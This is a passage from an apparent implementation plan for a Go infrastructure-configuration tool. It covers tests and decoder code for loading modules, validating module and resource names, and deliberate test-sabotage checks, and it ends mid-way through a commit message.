// Both entries must be named — a diagnostic that names only the second tells the
// user half of what they need — and NEITHER may survive into got.Modules. A
// "last one wins" implementation passes an error-count assertion and still
// silently instantiates the wrong module, so the count of decoded modules is the
// assertion that catches it.
func TestTwoEntriesDerivingTheSameNameIsAnError(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  - https://github.com/acme/infra-app-stack:v1.2.0
  - https://github.com/other/infra-app-stack:v2.0.0
`)
	got, ds := Decode(files)
	d := requireErrorAbout(t, ds,
		`two modules are both named "infra_app_stack"`,
		"github.com/acme/infra-app-stack:v1.2.0",
		"github.com/other/infra-app-stack:v2.0.0",
		"name:")
	if d.Origin.Line != 6 {
		t.Errorf("diagnostic points at line %d, want the SECOND entry at line 6", d.Origin.Line)
	}
	for _, m := range got.Modules {
		if m.Name == "infra_app_stack" {
			t.Errorf("a colliding module survived decoding as %+v; "+
				"resolving a collision by order is what the `name:` form exists to prevent", m)
		}
	}
}

// TestModuleEntryUnknownKeyIsAnError. `inputs` gets its own assertion because it
// is the migration trap: loading no longer takes inputs, and a user moving from
// the older spelling will write them here. The action has to say where they go.
func TestModuleEntryUnknownKeyIsAnError(t *testing.T) {
	t.Run("inputs", func(t *testing.T) {
		files := writeConfig(t, `
project: myapp

modules:
  - name: app
    source: ./modules/app
    inputs:
      replicas: 3
`)
		_, ds := Decode(files)
		d := requireErrorAbout(t, ds, `unknown key "inputs" in `+"`modules`"+`[0]`)
		if !strings.Contains(d.Action, "module.app") {
			t.Errorf("action does not say where inputs go — on the resource that instantiates the module: %s", d.Action)
		}
	})

	t.Run("typo", func(t *testing.T) {
		files := writeConfig(t, `
project: myapp

modules:
  - name: app
    source: ./modules/app
    sorce: ./oops
`)
		_, ds := Decode(files)
		requireErrorAbout(t, ds, `unknown key "sorce" in `+"`modules`"+`[0]`, "`name` and `source`")
	})
}

// TestModuleEntryWithoutSourceIsAnError.
func TestModuleEntryWithoutSourceIsAnError(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  - name: app
`)
	_, ds := Decode(files)
	requireErrorAbout(t, ds, "`modules`[0] has no `source`", "source: ./modules/app")
}

// TestExplicitNameMustBeAnIdentifier. A module's name becomes half of a resource
// type, `module.<name>`, so a name containing a dot would produce a type stage 5
// reads as a path into a module.
func TestExplicitNameMustBeAnIdentifier(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  - name: app.stack
    source: ./modules/app
`)
	_, ds := Decode(files)
	requireErrorAbout(t, ds, `module name "app.stack" is not a valid identifier`, "module.app.stack")
}

// TestModuleTypeSpelling covers contract Amendment 8c's first two guards AND the
// accepted spelling.
//
// The accepted case is what stops this being a guard that rejects everything: a
// check refusing both malformed spellings and also refusing `module.app_stack`
// passes both rejection assertions and makes modules uninstantiable.
func TestModuleTypeSpelling(t *testing.T) {
	t.Run("no module name", func(t *testing.T) {
		files := writeConfig(t, "project: myapp\n\nresources:\n  prod:\n    type: module.\n")
		_, ds := Decode(files)
		requireErrorAbout(t, ds, `resource "prod" has type "module." with no module name`, "module.app_stack")
	})

	t.Run("path into a module", func(t *testing.T) {
		files := writeConfig(t, "project: myapp\n\nresources:\n  prod:\n    type: module.app.database\n")
		_, ds := Decode(files)
		d := requireErrorAbout(t, ds, `resource "prod" names a path into a module, not a module`)
		if !strings.Contains(d.Action, "type: module.app") {
			t.Errorf("action does not give the corrected type: %s", d.Action)
		}
	})

	t.Run("accepted", func(t *testing.T) {
		files := writeConfig(t, "project: myapp\n\nresources:\n  prod:\n    type: module.app_stack\n    replicas: 3\n")
		got, ds := Decode(files)
		requireNoErrors(t, ds)
		if got.Resources[0].Type != "module.app_stack" {
			t.Errorf("Type = %q", got.Resources[0].Type)
		}
		// A caller's input is an ordinary attribute. If it were anything else,
		// stage 6's bindAttribute would not see it and its provenance would have
		// to be re-derived — contract Amendment 8b.
		attr, ok := got.Resources[0].Attributes["replicas"]
		if !ok {
			t.Fatalf("replicas is not an attribute: %+v", got.Resources[0].Attributes)
		}
		if n, _ := attr.Value.AsInt(); n != 3 {
			t.Errorf("replicas = %v", attr.Value.Raw)
		}
	})

	t.Run("a provider type containing module is untouched", func(t *testing.T) {
		// "modulefoo.thing" does not begin with "module." and must not be
		// caught by a prefix check written as strings.Contains or as a check on
		// the first segment alone.
		files := writeConfig(t, "project: myapp\n\nresources:\n  prod:\n    type: modulefoo.thing\n")
		got, ds := Decode(files)
		requireNoErrors(t, ds)
		if got.Resources[0].Type != "modulefoo.thing" {
			t.Errorf("Type = %q", got.Resources[0].Type)
		}
	})
}

// TestResourceNameWithADotIsRefused is contract Amendment 16a, and the fixture
// is the exact one that validates clean at HEAD — `✓ Configuration valid`,
// exit 0, writing the state key "module.prod.database".
//
// That key is byte for byte what the resource `database` inside module instance
// `prod` writes once M5 lands, because Address.String() returns Name verbatim
// when Module is empty. The assertion that the resource is NOT decoded is the
// one that matters: a diagnostic alone would still leave the colliding decl in
// the set for anything downstream that does not check for errors first.
func TestResourceNameWithADotIsRefused(t *testing.T) {
	files := writeConfig(t, `
project: myapp

resources:
  module.prod.database:
    type: test.network
    cidr: 10.0.0.0/16
`)
	got, ds := Decode(files)
	d := requireErrorAbout(t, ds, `resource name "module.prod.database" contains a dot`, "state")
	if !strings.Contains(d.Action, "module_prod_database") {
		t.Errorf("action does not offer a usable replacement: %s", d.Action)
	}
	if len(got.Resources) != 0 {
		t.Errorf("a resource with a colliding address name was still decoded: %+v", got.Resources[0])
	}
}

// TestResourceNameMustBeAnIdentifier checks BOTH answers.
//
// The accepted half is not decoration: this guard runs on every resource in
// every configuration, so one that is even slightly too strict breaks real
// projects. Hyphens and leading underscores are in the accept list because both
// are ordinary in real names and neither can collide with an address.
//
// (Verified before this task was written: every resource name in every existing
// fixture in the tree is already a plain identifier, so the whole suite staying
// green is the broader evidence that this does not over-reject.)
func TestResourceNameMustBeAnIdentifier(t *testing.T) {
	for _, name := range []string{"9lives", "my name", "web!", ""} {
		t.Run("rejected/"+name, func(t *testing.T) {
			files := writeConfig(t, "project: myapp\n\nresources:\n  "+strconv.Quote(name)+":\n    type: test.network\n")
			_, ds := Decode(files)
			requireErrorAbout(t, ds, "is not a valid identifier")
		})
	}

	for _, name := range []string{"web", "web_2", "my-app", "_internal", "A"} {
		t.Run("accepted/"+name, func(t *testing.T) {
			files := writeConfig(t, "project: myapp\n\nresources:\n  "+name+":\n    type: test.network\n")
			got, ds := Decode(files)
			requireNoErrors(t, ds)
			if len(got.Resources) != 1 || got.Resources[0].Name != name {
				t.Errorf("decoded %+v, want one resource named %q", got.Resources, name)
			}
		})
	}
}

// TestModulesIsNoLongerAnUnrecognisedTopLevelKey pins the guard this task
// removes. The fragment quotes the key, because decodeDocument's default arm
// emits the same sentence for every unrecognised key.
func TestModulesIsNoLongerAnUnrecognisedTopLevelKey(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  - ./modules/networking
`)
	got, ds := Decode(files)
	for _, d := range ds {
		if strings.Contains(d.Summary, `unrecognised top-level key "modules"`) {
			t.Fatalf("`modules:` is still being ignored with a warning: %s", d.Summary)
		}
	}
	requireNoErrors(t, ds)
	if len(got.Modules) != 1 || got.Modules[0].Name != "networking" {
		t.Fatalf("decoded %+v, want one module named networking", got.Modules)
	}
}

// TestModuleEntryShapeErrors covers the entry shapes requireScalar handles, so
// an alias or a null does not silently become a module named after an anchor.
func TestModuleEntryShapeErrors(t *testing.T) {
	t.Run("null entry", func(t *testing.T) {
		files := writeConfig(t, "project: myapp\n\nmodules:\n  -\n")
		_, ds := Decode(files)
		requireErrorAbout(t, ds, "`modules`[0] has no value")
	})

	t.Run("nested list", func(t *testing.T) {
		files := writeConfig(t, "project: myapp\n\nmodules:\n  - - ./modules/net\n")
		_, ds := Decode(files)
		requireErrorAbout(t, ds, "`modules`[0] must be a single value, not a list or a mapping")
	})
}

// TestDuplicateExplicitNameIsAnError — the collision rule applies to names
// written with `name:` just as it does to derived ones.
func TestDuplicateExplicitNameIsAnError(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  - name: app
    source: ./modules/one
  - name: app
    source: ./modules/two
`)
	_, ds := Decode(files)
	requireErrorAbout(t, ds, `two modules are both named "app"`, "./modules/one", "./modules/two", "name:")
}
```

Every assertion above goes through `requireNoErrors`, `requireErrorAbout` or
`errorSummaries`, which already live in this package's tests
(`internal/config/decode_variables_test.go`), so this file imports only `strings` and
`testing`. Do not add an unused `diag` import to match the other test files.

Run:

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test ./internal/config/ -count=1 -run 'TestDecodeModulesList|TestModule|TestTwoEntries|TestDuplicateExplicit|TestUndeivable|TestExplicitName'
```

**Expected failure:** a compile error, `got.Modules undefined (type *ProjectDecl has no
field or method Modules)` and `undefined: ModuleLoadDecl`.
`ProjectDecl` has nowhere to put a module.

#### 2.2 — Add the declaration type

In `internal/config/declarations.go`, add after `EnvironmentDecl`:

```go
// ModuleLoadDecl is one entry in `modules:` (PLAN.md §11.1).
//
// It makes a module AVAILABLE under a name and says nothing else about it. It
// carries no inputs and no depends_on: loading and instantiating are separate
// steps, and both of those belong to the instantiation, which is an ordinary
// ResourceDecl whose Type is "module.<Name>" (§11.2).
//
// That separation is why there is no ModuleInputDecl. A caller's input is an
// AttributeDecl in ResourceDecl.Attributes, bound by stage 6's existing
// bindAttribute, so it carries whatever provenance its source gave it with no
// module-specific rung logic — which is a thing the compiler already gets right
// for every other attribute.
type ModuleLoadDecl struct {
	// Name is what a resource type refers to: `type: module.<Name>`. It is
	// either written explicitly with `name:` or derived from Source.
	Name string
	// Source is the PARSED source, not the text (contract Amendment 15b). It has
	// been through internal/modules/source.Parse, so it is one Parse accepted: a
	// path, or a git remote with a scheme on the allowlist and the required
	// `:tag-or-hash` pin.
	//
	// Parsed rather than raw so stage 5 CANNOT re-report. Stage 5 hands this
	// straight to Cache.Resolve, which takes a source.Source — so it never
	// parses, so it cannot emit a parse diagnostic a second time. Storing the
	// string instead would leave "do not report this twice" as a rule an
	// implementer has to remember, and "call Parse and pass the diagnostics up"
	// is the obvious thing to write.
	//
	// Stage 2 still touches neither the filesystem nor the network: Parse is
	// pure. What moved to stage 2 is the REPORTING, because Parse's diagnostics
	// want a line and stage 2 is the only stage that has one — so a missing pin,
	// a refused scheme and `ext::` all surface at `infra validate`.
	//
	// There is no SourceOrigin field: source.Source carries its own Origin,
	// stamped from the one passed to Parse, and a second copy of that fact is a
	// second thing to keep true.
	Source source.Source
	Origin value.Origin
}
```

and add the field to `ProjectDecl`, below `Environments`:

```go
	Modules      []ModuleLoadDecl  // sorted by Name
```

#### 2.3 — Write the decoder

Create `internal/config/decode_modules.go`:

```go
package config

import (
	"strconv"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/internal/modules/source"
	"github.com/infrata/infrata/pkg/value"
)

// ModuleTypePrefix marks a resource type that instantiates a loaded module
// (PLAN.md §11.2). Stage 5 selects instances with it, so the two namespaces can
// never collide and a reader never has to consult `modules:` to know which kind
// of type they are looking at.
const ModuleTypePrefix = "module."

// loadedName records where a module name came from, so a collision diagnostic
// can name BOTH entries rather than only the second one. Naming only the second
// tells a user half of what they need: which two sources collided is the whole
// content of the message.
type loadedName struct {
	source string
	origin value.Origin
}

// decodeModuleLoads decodes a `modules:` block into dst.
//
// dst is a *[]ModuleLoadDecl rather than a *ProjectDecl because modules nest: a
// module file has a `modules:` block of its own (PLAN.md §11.3), and that one
// appends to a ModuleFile. One decoder serves both, so what a `modules:` entry
// means cannot differ depending on which document it appears in.
func decodeModuleLoads(path string, node *yaml.Node, dst *[]ModuleLoadDecl, ds *diag.Diagnostics, seen map[string]loadedName) {
	if node.Kind != yaml.SequenceNode {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "`modules` must be a list of module sources",
			Detail: "Unlike `resources`, `variables` and `environments`, `modules` is a LIST. " +
				"A mapping's key would have to be the module's name, and a name is optional — it is derived " +
				"from the source unless `name:` overrides it (PLAN.md §11.1).",
			Action: "Write each module as a list entry, for example `- ./modules/networking`, or " +
				"`- name: app` with `source:` beneath it.",
			Origin: originOf(path, node),
		})
		return
	}

	for i, entry := range node.Content {
		m, raw, ok := decodeModuleLoad(path, i, entry, ds)
		if !ok {
			continue
		}

		if first, dup := seen[m.Name]; dup {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "two modules are both named " + strconv.Quote(m.Name),
				Detail: strconv.Quote(first.source) + ", loaded at " + describeOrigin(first.origin) + ", and " +
					strconv.Quote(raw) + " both resolve to the name " + strconv.Quote(m.Name) +
					". A resource writing `type: " + ModuleTypePrefix + m.Name + "` would have two modules to choose from.",
				Action: "Give one of them a different name with `name:`, for example `- name: " + m.Name + "_v2`.",
				Origin: m.Origin,
			})
			// NEITHER entry is kept. Dropping only the second would be
			// "last one wins" inverted, which silently picks a module rather
			// than reporting that two were offered — and the `name:` form
			// exists precisely so this case is never decided by order.
			removeModuleNamed(dst, m.Name)
			continue
		}
		seen[m.Name] = loadedName{source: raw, origin: m.Origin}
		*dst = append(*dst, m)
	}
}

// removeModuleNamed drops an already-appended entry whose name has turned out
// to collide. Linear because a `modules:` block is short and the alternative —
// deferring every append until the whole list is walked — would lose the
// document order the diagnostics above are built from.
func removeModuleNamed(dst *[]ModuleLoadDecl, name string) {
	out := (*dst)[:0]
	for _, m := range *dst {
		if m.Name != name {
			out = append(out, m)
		}
	}
	*dst = out
}

// decodeModuleLoad returns the decl and the source AS THE USER WROTE IT. The raw
// text is returned separately rather than stored, because ModuleLoadDecl.Source
// is parsed and a parsed source cannot always be rendered back byte for byte — a
// trailing slash, an omitted `.git`. The only thing that needs the original
// spelling is the collision diagnostic, which is built here in the caller, where
// the raw text is still in hand.
func decodeModuleLoad(path string, index int, entry *yaml.Node, ds *diag.Diagnostics) (ModuleLoadDecl, string, bool) {
	what := "`modules`[" + strconv.Itoa(index) + "]"
	origin := originOf(path, entry)

	if entry.Kind == yaml.MappingNode {
		return decodeModuleLoadMapping(path, what, entry, origin, ds)
	}

	// The scalar form: the source, with the name derived from it. requireScalar
	// reports the alias, nested-list and null cases, each of which would
	// otherwise silently produce a wrong source — an alias node's Value is the
	// ANCHOR'S NAME, so `- *base` would load a module from the path "base".
	raw, ok := requireScalar(path, what, entry, ds)
	if !ok {
		return ModuleLoadDecl{}, "", false
	}
	parsed, ok := parseSource(raw, origin, ds)
	if !ok {
		return ModuleLoadDecl{}, "", false
	}
	name, nameDS := source.DeriveName(parsed)
	ds.Extend(nameDS)
	if nameDS.HasErrors() {
		// DeriveName has already said why the name could not be derived and
		// named the `name:` form as the fix. The entry is DROPPED rather than
		// kept with an empty name — a module with no usable name in ProjectDecl
		// is exactly what anything downstream that does not check errors first
		// would trip over.
		return ModuleLoadDecl{}, "", false
	}
	return ModuleLoadDecl{Name: name, Source: parsed, Origin: origin}, raw, true
}

// parseSource validates a source through internal/modules/source and returns the
// parsed form, which is what ModuleLoadDecl carries.
//
// Parse is pure — no disk, no network — so calling it here does not break stage
// 2's rule. What it buys is REPORTING at the right place: Parse takes an origin
// because its diagnostics are meant to point at a line, and stage 2 is the only
// stage that has one. A missing `:tag-or-hash` pin, a refused scheme, and git's
// `ext::` transport are therefore all reported by `infra validate`, at the line
// the source was written on, before anything is fetched.
//
// Storing the PARSED source rather than the string is what makes the other half
// structural (contract Amendment 15b): stage 5 receives a source.Source and hands
// it to Cache.Resolve, so it cannot re-emit a parse diagnostic, because it never
// parses. "Do not report this twice" stops being a rule an implementer has to
// remember and becomes one they cannot break.
func parseSource(raw string, origin value.Origin, ds *diag.Diagnostics) (source.Source, bool) {
	parsed, parseDS := source.Parse(raw, origin)
	ds.Extend(parseDS)
	if parseDS.HasErrors() {
		// Parse has already said what is wrong with this source and where.
		// Deriving a name from a location it could not determine would add a
		// second, confusing diagnostic about the same entry.
		return source.Source{}, false
	}
	return parsed, true
}

func decodeModuleLoadMapping(path, what string, body *yaml.Node, origin value.Origin, ds *diag.Diagnostics) (ModuleLoadDecl, string, bool) {
	m := ModuleLoadDecl{Origin: origin}

	// raw and rawOrigin hold the source as written, until it is parsed below.
	// They are locals rather than fields because ModuleLoadDecl.Source is the
	// PARSED source (contract Amendment 15b), and the raw text is needed only
	// for the collision diagnostic the caller builds.
	var raw string
	var rawOrigin value.Origin

	// sourceReported records that `source` was present but unusable, so the
	// "has no `source`" check below does not fire a second, misleading
	// diagnostic about the same key — the suppression decodeResources makes for
	// `type`.
	sourceReported := false
	seenKeys := map[string]value.Origin{}

	for i := 0; i+1 < len(body.Content); i += 2 {
		key, val := body.Content[i], body.Content[i+1]
		keyOrigin := originOf(path, key)
		if first, dup := seenKeys[key.Value]; dup {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  strconv.Quote(key.Value) + " is set more than once in " + what,
				Detail:   "The last assignment would silently win. " + strconv.Quote(key.Value) + " is also set at " + describeOrigin(first) + ".",
				Action:   "Remove one of the two assignments.",
				Origin:   keyOrigin,
			})
			continue
		}
		seenKeys[key.Value] = keyOrigin

		switch key.Value {
		case "source":
			text, ok := requireScalar(path, what+"'s `source`", val, ds)
			if !ok {
				sourceReported = true
				break
			}
			raw, rawOrigin = text, originOf(path, val)

		case "name":
			text, ok := requireScalar(path, what+"'s `name`", val, ds)
			if !ok {
				break
			}
			if !identifierSegment(text) {
				ds.Add(diag.Diagnostic{
					Severity: diag.SeverityError,
					Summary:  "module name " + strconv.Quote(text) + " is not a valid identifier",
					Detail: "A module's name becomes half of a resource type — `type: " + ModuleTypePrefix + text +
						"` — so it must be a letter or underscore followed by letters, digits, underscores or hyphens. " +
						"A name containing a dot would read as a path into a module.",
					Action: "Use letters, digits and underscores, for example `name: " + strings.NewReplacer(".", "_", "-", "_").Replace(text) + "`.",
					Origin: originOf(path, val),
				})
				break
			}
			m.Name = text

		default:
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "unknown key " + strconv.Quote(key.Value) + " in " + what,
				Detail: "A `modules:` entry understands `name` and `source`, and nothing else. Loading a module says " +
					"only where it comes from and what to call it; values are passed when it is INSTANTIATED (PLAN.md §11.2).",
				Action: moduleEntryKeyAction(key.Value, m.Name),
				Origin: keyOrigin,
			})
		}
	}

	if raw == "" {
		if !sourceReported {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  what + " has no `source`",
				Detail:   "Every module entry must say where the module comes from, and this one would load nothing — so every resource writing `type: " + ModuleTypePrefix + "…` for it would fail with no explanation of why.",
				Action:   "Add `source: ./modules/" + defaultedName(m.Name) + "`.",
				Origin:   origin,
			})
		}
		return ModuleLoadDecl{}, "", false
	}

	// Parsed for EVERY entry, including one that named itself. A `name:` says
	// what to call the module; it says nothing about whether the source is
	// fetchable, so an unpinned or `ext::` source must be reported either way.
	parsed, ok := parseSource(raw, rawOrigin, ds)
	if !ok {
		return ModuleLoadDecl{}, "", false
	}
	m.Source = parsed

	if m.Name == "" {
		name, nameDS := source.DeriveName(parsed)
		ds.Extend(nameDS)
		if nameDS.HasErrors() {
			return ModuleLoadDecl{}, "", false
		}
		m.Name = name
	}
	return m, raw, true
}

// moduleEntryKeyAction says what to do with a key that does not belong on a
// `modules:` entry. `inputs` gets its own answer because it is the migration
// trap: loading used to take inputs, and a user carrying that shape forward
// needs to be told where they went, not merely that they are wrong.
func moduleEntryKeyAction(key, name string) string {
	if key == "inputs" {
		return "Remove `inputs`, and pass the values on the resource that instantiates this module — " +
			"a resource with `type: " + ModuleTypePrefix + defaultedName(name) + "` and the values as its attributes."
	}
	return "Remove " + strconv.Quote(key) + "."
}

// defaultedName gives a stand-in for an entry whose name could not be
// determined, so an action can still show a usable example line.
func defaultedName(name string) string {
	if name == "" {
		return "<name>"
	}
	return name
}

// identifierSegment reports whether s is a plain identifier: a letter or
// underscore, then letters, digits, underscores or hyphens.
//
// Shared by module names, which become half of a resource type, and by Task 3's
// bare-reference detection. One rule for what a name looks like, in one place.
func identifierSegment(s string) bool {
	if s == "" {
		return false
	}
	for i, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r == '_':
		case i > 0 && (r >= '0' && r <= '9' || r == '-'):
		default:
			return false
		}
	}
	return true
}

// checkResourceName validates a resource's logical name (contract Amendment 16a).
//
// A name IS an address (pkg/address), and an address is a state key. Stage 2 is
// the only stage that still holds the line the name was written on.
//
// The dot is the dangerous character, and it is why this lands in M5 rather than
// on a follow-up list. Address.String() returns Name verbatim when Module is
// empty, so a resource literally named "module.prod.database" writes the state
// key "module.prod.database" — byte for byte what the resource `database` inside
// module instance `prod` writes once modules exist. Such a state file is
// unambiguous today and becomes ambiguous the moment the first module ships, so
// this is the last milestone in which the fix is a diagnostic rather than a
// migration.
//
// Amendment 14a is the same collision through the other door: it guards the
// REFERENCE grammar in parseReference, so ${module.prod.db.id} cannot be
// written; this guards the DECLARATION, so the string cannot become an address
// at all. A reference is parsed out of an expression and a name is read from a
// mapping key, so neither path reaches the other — delete either as duplicated
// and half the collision reopens.
//
// It serves module files too, because decodeResources is shared: a resource
// inside a module is no freer to name itself `module.x` than a root one.
func checkResourceName(path, name string, origin value.Origin, ds *diag.Diagnostics) bool {
	if identifierSegment(name) {
		return true
	}

	// Two branches, because the dot is a collision and everything else is
	// merely malformed. One message covering both would explain the address
	// hazard to someone who wrote a space.
	if strings.Contains(name, ".") {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "resource name " + strconv.Quote(name) + " contains a dot",
			Detail: "A resource's name is its address, and a dot is how an address separates module levels — so " +
				strconv.Quote(name) + " is indistinguishable from the address of a resource inside a module, and the " +
				"two would share one key in state.",
			Action: "Rename it without dots, for example `" + strings.ReplaceAll(name, ".", "_") + ":`.",
			Origin: origin,
		})
		return false
	}

	ds.Add(diag.Diagnostic{
		Severity: diag.SeverityError,
		Summary:  "resource name " + strconv.Quote(name) + " is not a valid identifier",
		Detail: "A resource's name is its address and appears in state, in plans and in `${...}` references, so it " +
			"must be a letter or underscore followed by letters, digits, underscores or hyphens.",
		Action: "Rename it using letters, digits, underscores and hyphens, starting with a letter or underscore.",
		Origin: origin,
	})
	return false
}

// checkResourceType validates a resource's `type`, which for a module call is a
// property of the text and therefore stage 2's to check.
//
// Stage 5 selects module instances with strings.HasPrefix(r.Type, "module.")
// (contract Amendment 8c), so a malformed `module.` type is SELECTED and then
// looked up as a module named "" or "a.b". Reporting it here, where the line
// number is, is the difference between naming the typo and reporting that some
// module does not exist.
//
// It returns false when the type is unusable, so the caller can suppress its
// "has no `type`" check the way it does for a `type` that failed requireScalar.
func checkResourceType(path, resource, typ string, origin value.Origin, ds *diag.Diagnostics) bool {
	if !strings.HasPrefix(typ, ModuleTypePrefix) {
		return true
	}
	name := strings.TrimPrefix(typ, ModuleTypePrefix)

	switch {
	case name == "":
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "resource " + strconv.Quote(resource) + " has type " + strconv.Quote(typ) + " with no module name",
			Detail:   "`" + ModuleTypePrefix + "` instantiates a module loaded in `modules:`, and this names none.",
			Action:   "Write the loaded module's name, for example `type: " + ModuleTypePrefix + "app_stack`.",
			Origin:   origin,
		})
		return false

	case strings.Contains(name, "."):
		top := name[:strings.Index(name, ".")]
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "resource " + strconv.Quote(resource) + " names a path into a module, not a module",
			Detail: "`" + typ + "` reads as a path inside " + strconv.Quote(top) + ". A resource instantiates a " +
				"top-level module loaded in `modules:`; resources INSIDE that module are reached by referencing " +
				"the instance, such as ${" + resource + ".endpoint}.",
			Action: "Write `type: " + ModuleTypePrefix + top + "`.",
			Origin: origin,
		})
		return false
	}
	return true
}
```

#### 2.4 — Wire it into `Decode` and `decodeResources`

Five edits in `internal/config/decode.go`.

In `Decode`, beside the existing `seen*` maps:

```go
	// seenModules maps a module's NAME to the entry that claimed it, so a
	// collision names both sources. It is separate from seenResources because
	// they are separate namespaces: a module name is only ever half of a
	// resource type (`module.app`), never a bare name, so a module called `app`
	// and a resource called `app` do not collide.
	seenModules := map[string]loadedName{}
```

In `decodeDocument`'s signature, add the map:

```go
func decodeDocument(path string, doc *yaml.Node, out *ProjectDecl, ds *diag.Diagnostics,
	seenResources, seenVariables map[string]value.Origin, seenEnvironments map[string]int,
	seenModules map[string]loadedName) {
```

with the new case in its switch, after `case "environments":`:

```go
		case "modules":
			decodeModuleLoads(path, val, &out.Modules, ds, seenModules)
```

and the one call site in `Decode`'s `case FileProject:` arm updated to pass `seenModules`.

In the sort block, alongside the existing three:

```go
	sort.Slice(out.Modules, func(i, j int) bool { return out.Modules[i].Name < out.Modules[j].Name })
```

In `decodeResources`, immediately after `r` is built and BEFORE the duplicate-name check,
add the name guard. A rejected name is skipped rather than recorded in `seen`, which is what
the duplicate branch already does for a name it will not use:

```go
		r := &ResourceDecl{
			Name:       nameNode.Value,
			Attributes: map[string]AttributeDecl{},
			Origin:     originOf(path, nameNode),
		}

		if !checkResourceName(path, r.Name, r.Origin, ds) {
			continue
		}
```

And the `case "type":` arm gains the spelling check. Replace:

```go
			case "type":
				text, ok := requireScalar(path, "`type`", val, ds)
				if !ok {
					// The `type` key is present but unusable. Reporting "has no
					// `type`" as well would name a symptom rather than the
					// problem.
					typeReported = true
					break
				}
				r.Type = text
```

with:

```go
			case "type":
				text, ok := requireScalar(path, "`type`", val, ds)
				if !ok {
					// The `type` key is present but unusable. Reporting "has no
					// `type`" as well would name a symptom rather than the
					// problem.
					typeReported = true
					break
				}
				if !checkResourceType(path, r.Name, text, originOf(path, val), ds) {
					// Same suppression, same reason: a malformed `module.` type
					// has been reported, and "has no `type`" would describe a
					// symptom of it.
					typeReported = true
					break
				}
				r.Type = text
```

#### 2.5 — Run the tests, then prove they discriminate

```bash
go test ./internal/config/ -count=1
go test -race -count=1 ./...
go vet ./... && gofmt -l .
```

**Expected: green throughout**, with no edits to any pre-existing test — `modules:` was
previously only warned about, so nothing asserted on its absence, and no existing fixture
uses a `module.` type.

Then break each of the three behaviours most at risk of not discriminating:

```bash
sed -i '/sort.Slice(out.Modules, func/d' internal/config/decode.go
go test ./internal/config/ -count=1 -run TestDecodeModulesList
```

**Expected: FAIL**, `modules are not sorted by name: got [zeta alpha infra_app_stack app_stack_v2] …`.
Restore the line.

```bash
# "Last one wins": keep the second entry instead of dropping both.
sed -i 's/^\t\t\tremoveModuleNamed(dst, m.Name)$/\t\t\tremoveModuleNamed(dst, m.Name); *dst = append(*dst, m)/' internal/config/decode_modules.go
go test ./internal/config/ -count=1 -run TestTwoEntriesDerivingTheSameName
```

**Expected: FAIL**, `a colliding module survived decoding as …`. The error is still
reported, so an assertion that checked only the diagnostic would pass here — which is why
the test also counts what survived. Restore the line.

```bash
# Report DeriveName's refusal but keep the entry anyway — the refusal test's
# whole point is that this does not pass.
sed -i 's|^\t\treturn ModuleLoadDecl{}, "", false$|\t\tm.Name = "" // sabotage|' internal/config/decode_modules.go
go test ./internal/config/ -count=1 -run TestUndeivableNameIsStage2sHalf
```

**Expected: FAIL**, `an entry whose name could not be derived was still decoded`. The
diagnostic still fires under this sabotage, so an assertion on the message alone would pass —
which is the point: a refusal test must assert the thing did not happen, not that we said it
would not. Restore the line; note the `sed` matches more than one site, so revert with
`git checkout -- internal/config/decode_modules.go` if nothing else in the file is
uncommitted, or by hand otherwise.

**There is no `.git`-stripping discrimination step in this task any more.** Name derivation
is `source.DeriveName`'s (contract Amendment 20a), and so is the step that sabotages it.

```bash
# Accept any name, which is HEAD's behaviour.
sed -i 's|^\t\tif !checkResourceName(path, r.Name, r.Origin, ds) {$|\t\tif false {|' internal/config/decode.go
go test ./internal/config/ -count=1 -run 'TestResourceNameWithADotIsRefused|TestResourceNameMustBeAnIdentifier'
```

**Expected: FAIL** with `want exactly 1 error, got 0` on the dotted case — which is precisely
the HEAD behaviour this closes: that configuration validates clean and writes a state key
that a module will later collide with. The accepted half of
`TestResourceNameMustBeAnIdentifier` still passes, as it must: it is checking that ordinary
names are untouched, and removing a guard cannot break that. Restore the line and re-run
`go test ./internal/config/ -count=1`.

**Handover to Author D, do not lose in the move.** The other half of this discrimination
belongs with whatever strips the `:ref`, which contract Amendment 13d moved to
`internal/modules/source.Parse`. The finding: **the `:ref` suffix must be stripped BEFORE
`.git`.** Strip `.git` first and `infra.git:v1.2.0` becomes `infra.git:v1.2.0` unchanged —
there is no longer a `.git` at the end to match — so the location keeps its ref and the
name comes out wrong rather than absent. A test over a source carrying BOTH, such as
`https://github.com/acme/infra.git:v1.2.0`, is what pins it, and the equivalent
discrimination step is to swap the two strips inside `Parse` and watch that case fail.
This task cannot test it: by the time `source.DeriveName` runs, the ref is already
gone.

#### 2.6 — Commit

```bash
git add internal/config/decode_modules.go internal/config/decode_modules_test.go
git add internal/config/declarations.go internal/config/decode.go
git commit -m "Decode the modules: list, and the module.<name> resource type

Loading a module and instantiating it are separate steps (PLAN.md §11). \`modules:\`
is a LIST of sources carrying no inputs; a resource of type \`module.<name>\`
instantiates it, so a caller's inputs are ordinary attributes bound by the
existing bindAttribute and carry their own provenance with no module-specific
rung logic.

Until now \`modules:\` was an unrecognised top-level key with a warning, so a user
following §11.1 got a plan missing everything the modules declare, with nothing
saying they were ignored.

A name is either written with \`name:\` or derived by source.DeriveName, which
owns that rule outright — deriving it here too would be two spellings that must
agree forever, each green against its own table while they drift. Two entries
resolving to one name is an error naming both, and NEITHER is kept: deciding it
by order would silently instantiate the wrong module and would make the \`name:\`
form pointless.

Sources go through internal/modules/source.Parse here, so a missing pin, a
refused scheme and ext:: are reported by \`infra validate\` at the line they were
